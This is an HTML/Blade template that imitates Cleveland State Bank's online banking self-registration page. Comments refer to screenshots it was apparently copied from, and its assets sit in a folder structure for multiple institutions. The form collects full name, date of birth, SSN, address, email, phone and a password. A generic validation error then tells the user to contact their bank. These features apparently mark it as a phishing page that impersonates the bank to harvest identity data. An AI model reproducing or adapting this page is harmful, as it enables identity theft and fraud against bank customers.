<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Self-Registration | Cleveland State Bank</title>

<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    background-color: #edf0f4;
    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/csb-bg-ribbons.svg') }}");
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 30px 16px;
    position: relative;
}

.csb-modal-card {
    width: 100%;
    max-width: 720px;
    background: #ffffff;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
    border-radius: 2px;
    overflow: hidden;
}

/* Red Header Bar */
.modal-header-red {
    background-color: #c8232c;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 16px;
    position: relative;
}

.header-back-btn {
    color: #ffffff;
    font-size: 20px;
    font-weight: bold;
    cursor: pointer;
    background: none;
    border: none;
    line-height: 1;
    padding: 4px;
}

.modal-header-title {
    color: #ffffff;
    font-size: 13.5px;
    font-weight: bold;
    letter-spacing: 0.8px;
    text-transform: uppercase;
    font-family: Arial, Helvetica, sans-serif;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.modal-close-btn {
    color: #ffffff;
    font-size: 18px;
    font-weight: bold;
    text-decoration: none;
    line-height: 1;
    cursor: pointer;
    margin-left: auto;
}

.modal-close-btn:hover,
.header-back-btn:hover {
    opacity: 0.8;
}

/* Modal Body */
.modal-body {
    padding: 32px 36px 36px;
}

/* Step 0: Welcome Screen (Screenshot 3) */
.welcome-body {
    text-align: center;
}

.csb-welcome-logo {
    width: 160px;
    height: auto;
    max-height: 190px;
    object-fit: contain;
    margin: 0 auto 16px;
    display: block;
}

.modal-divider {
    height: 1px;
    background-color: #e2e8f0;
    margin: 20px 0;
    border: none;
}

.welcome-title {
    font-size: 16px;
    font-weight: bold;
    color: #222222;
    margin-bottom: 8px;
    font-family: Arial, Helvetica, sans-serif;
}

.welcome-desc {
    font-size: 13.5px;
    color: #444444;
    line-height: 1.5;
    max-width: 500px;
    margin: 0 auto;
    font-family: Arial, Helvetica, sans-serif;
}

.btn-started {
    background-color: #68b828;
    color: #ffffff;
    border: none;
    border-radius: 2px;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.8px;
    padding: 12px 32px;
    cursor: pointer;
    text-transform: uppercase;
    margin-top: 10px;
    transition: background-color 0.2s;
}

.btn-started:hover {
    background-color: #559e1d;
}

.back-to-signin {
    margin-top: 20px;
    display: block;
    color: #1b325f;
    font-size: 13px;
    font-weight: 500;
    text-decoration: none;
    text-align: center;
}

.back-to-signin:hover {
    text-decoration: underline;
}

/* Step 1: General Information (Screenshot 4) */
.section-heading {
    font-size: 13px;
    font-weight: bold;
    color: #4a5568;
    letter-spacing: 0.5px;
    text-transform: uppercase;
    padding-bottom: 6px;
    border-bottom: 1px solid #cbd5e0;
    margin-bottom: 16px;
    margin-top: 10px;
    font-family: Arial, Helvetica, sans-serif;
}

.form-grid-3 {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    gap: 12px;
    margin-bottom: 12px;
}

.form-grid-2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    margin-bottom: 12px;
}

.csb-field-box {
    position: relative;
    border: 1px solid #b0bec5;
    background: #ffffff;
    border-radius: 2px;
}

.required-tag {
    position: absolute;
    top: 3px;
    right: 6px;
    font-size: 10.5px;
    color: #78909c;
    pointer-events: none;
    font-style: italic;
}

.csb-field-box input {
    width: 100%;
    height: 48px;
    border: none;
    outline: none;
    padding: 10px 12px;
    font-size: 13px;
    font-weight: bold;
    color: #333333;
    letter-spacing: 0.5px;
}

.csb-field-box input::placeholder {
    color: #78909c;
    font-weight: bold;
    letter-spacing: 0.6px;
}

/* Bottom Actions Bar */
.bottom-actions-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 24px;
    padding-top: 16px;
    border-top: 1px solid #e2e8f0;
}

.step-indicator-pill {
    background-color: #e2e8f0;
    color: #4a5568;
    font-size: 12px;
    font-weight: bold;
    padding: 8px 18px;
    border-radius: 2px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
}

.btn-continue-submit {
    background-color: #68b828;
    color: #ffffff;
    border: none;
    border-radius: 2px;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.8px;
    padding: 10px 24px;
    cursor: pointer;
    text-transform: uppercase;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    transition: background-color 0.2s;
}

.btn-continue-submit:hover {
    background-color: #559e1d;
}

/* Error Banner Modal (Screenshot 5) */
.csb-error-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.45);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}

.csb-error-banner {
    width: 100%;
    background-color: #262626;
    color: #ffffff;
    padding: 32px 20px;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
}

.csb-error-title {
    font-size: 14px;
    font-weight: bold;
    color: #e0e0e0;
    letter-spacing: 0.8px;
    margin-bottom: 12px;
    text-transform: uppercase;
}

.csb-error-desc {
    font-size: 13.5px;
    line-height: 1.5;
    color: #ffffff;
    max-width: 600px;
    margin: 0 auto 20px;
}

.csb-error-btn {
    background-color: #d9534f;
    border: none;
    color: #ffffff;
    font-size: 13px;
    font-weight: bold;
    padding: 8px 36px;
    border-radius: 2px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.csb-error-btn:hover {
    background-color: #c9302c;
}

@media (max-width: 640px) {
    .form-grid-3, .form-grid-2 {
        grid-template-columns: 1fr;
        gap: 8px;
    }
}
</style>
</head>
<body>

    <div class="csb-modal-card">

        {{-- Step 0: Welcome Screen (Screenshot 3) --}}
        <div id="stepWelcome" @if($errors->any()) style="display:none;" @endif>
            <div class="modal-header-red">
                <span></span>
                <span class="modal-header-title">REGISTRATION</span>
                <a href="{{ route('login') }}" class="modal-close-btn" title="Close">&#10005;</a>
            </div>

            <div class="modal-body welcome-body">
                <img src="{{ asset('assets/institutions/clevelandstatebank/images/csb-stacked-logo.png') }}" alt="Cleveland State Bank" class="csb-welcome-logo">

                <div class="modal-divider"></div>

                <div class="welcome-title">Welcome to Self-Registration</div>
                <div class="welcome-desc">
                    Getting your online banking account set up is quick and easy. We will take you through the process step by step.
                </div>

                <div class="modal-divider"></div>

                <button type="button" class="btn-started" id="btnGetStarted">LET'S GET STARTED!</button>

                <a href="{{ route('login') }}" class="back-to-signin">Back to Sign In</a>
            </div>
        </div>

        {{-- Step 1: General Form (Screenshot 4) --}}
        <div id="stepForm" @if(!$errors->any()) style="display:none;" @endif>
            <div class="modal-header-red">
                <button type="button" class="header-back-btn" id="btnBackToWelcome" title="Back">&lsaquo;</button>
                <span class="modal-header-title">GENERAL</span>
                <a href="{{ route('login') }}" class="modal-close-btn" title="Close">&#10005;</a>
            </div>

            <div class="modal-body">
                <form method="POST" action="{{ route('register') }}" id="csbSelfRegForm">
                    @csrf

                    <!-- Personal Information -->
                    <div class="section-heading">PERSONAL INFORMATION</div>

                    <div class="form-grid-3">
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="first_name" value="{{ old('first_name') }}" placeholder="FIRST NAME" required>
                        </div>
                        <div class="csb-field-box">
                            <input type="text" name="middle_name" value="{{ old('middle_name') }}" placeholder="MIDDLE NAME">
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="last_name" value="{{ old('last_name') }}" placeholder="LAST NAME" required>
                        </div>
                    </div>

                    <div class="form-grid-2">
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" placeholder="DATE OF BIRTH" required>
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" placeholder="SSN / TAX ID" maxlength="11" required>
                        </div>
                    </div>

                    <!-- Contact Information -->
                    <div class="section-heading">CONTACT INFORMATION</div>

                    <div class="form-grid-2">
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="address" value="{{ old('address') }}" placeholder="ADDRESS" required>
                        </div>
                        <div class="csb-field-box">
                            <input type="text" name="address_line_2" value="{{ old('address_line_2') }}" placeholder="ADDRESS LINE 2">
                        </div>
                    </div>

                    <div class="form-grid-3">
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="city" value="{{ old('city') }}" placeholder="CITY" required>
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="state" value="{{ old('state') }}" placeholder="STATE" required>
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="text" name="zip_code" value="{{ old('zip_code') }}" placeholder="ZIP" required>
                        </div>
                    </div>

                    <div class="form-grid-3">
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="email" name="email" value="{{ old('email') }}" placeholder="EMAIL" required>
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="tel" name="phone" value="{{ old('phone') }}" placeholder="PHONE" required>
                        </div>
                        <div class="csb-field-box">
                            <span class="required-tag">required</span>
                            <input type="password" name="password" placeholder="PASSWORD" required>
                        </div>
                    </div>

                    <div class="bottom-actions-row">
                        <div class="step-indicator-pill">STEP 1 OF 3</div>
                        <button type="submit" class="btn-continue-submit">CONTINUE &rarr;</button>
                    </div>
                </form>
            </div>
        </div>

    </div>

    <!-- Error Banner Overlay (Shown when error exists) -->
    @if ($errors->any() || session('error'))
    <div class="csb-error-overlay" id="errorOverlay">
        <div class="csb-error-banner">
            <div class="csb-error-title">AN ERROR HAS OCCURRED</div>
            <div class="csb-error-desc">
                The information you entered could not be properly validated.<br>
                Please double check your information and if you feel it is<br>
                correct please contact your financial institution for further help.
            </div>
            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
        </div>
    </div>
    @endif

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
    <script>
    document.addEventListener('DOMContentLoaded', function () {
        var btnGetStarted = document.getElementById('btnGetStarted');
        var btnBack = document.getElementById('btnBackToWelcome');
        var stepWelcome = document.getElementById('stepWelcome');
        var stepForm = document.getElementById('stepForm');

        if (btnGetStarted) {
            btnGetStarted.addEventListener('click', function () {
                stepWelcome.style.display = 'none';
                stepForm.style.display = 'block';
            });
        }

        if (btnBack) {
            btnBack.addEventListener('click', function () {
                stepForm.style.display = 'none';
                stepWelcome.style.display = 'block';
            });
        }

        if ($('#ssn_field').length) {
            new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
        }
        if ($('#dob_field').length) {
            new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
        }
    });
    </script>
</body>
</html>
